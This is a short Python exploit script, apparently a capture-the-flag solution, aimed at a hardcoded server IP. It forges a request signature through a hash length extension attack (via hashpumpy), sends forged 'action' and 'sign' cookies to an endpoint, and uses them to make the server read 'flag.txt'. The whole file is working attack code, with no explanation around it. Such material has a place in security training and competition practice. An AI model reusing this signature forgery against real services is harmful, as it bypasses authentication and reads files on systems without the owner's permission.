#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/08/03, 09:13
"""

import requests as req
import hashpumpy
import sys
import urllib

URL = 'http://139.180.128.86'


def fuckSign(sign, param='scan'):
    return hashpumpy.hashpump(sign, param, 'readread', 16+len(param))


def getSign(param=''):
    res = req.get(URL+'/geneSign', params={'param': param})
    if res.status_code == 200:
        return res.content
    return False


def fuck(sign, param, action='scan'):
    param = urllib.quote(param)
    print("[+] De1ta param : %s" % param)
    params = {
        'param': param
    }
    cookies = {
        'action': urllib.quote(action),
        'sign': sign
    }
    res = req.get(URL+'/De1ta', params=params, cookies=cookies)
    if res.status_code == 200:
        return res.content
    else:
        return False


def read(param='scan'):
    print("[+] Param  : %s" % param)
    s = getSign(param)
    print("[+] Sign   : %s" % s)
    s = fuckSign(s, param)
    print("[+] reSign : %s" % s[0])
    print("[+] rParam : %s" % s[1][:-4])
    r = fuck(s[0], 'scan'+s[1][:-4], 'read')
    print("[+] Result : %s" % (r if not r else r))


def scan(param):
    s = getSign(param)
    print("[+] Target : %s" % param)
    print("[+] Sign   : %s" % s)
    r = fuck(s, param)
    print("[+] Result : %s" % r if not r else '')


if __name__ == '__main__':
    scan('flag.txt')
    read()
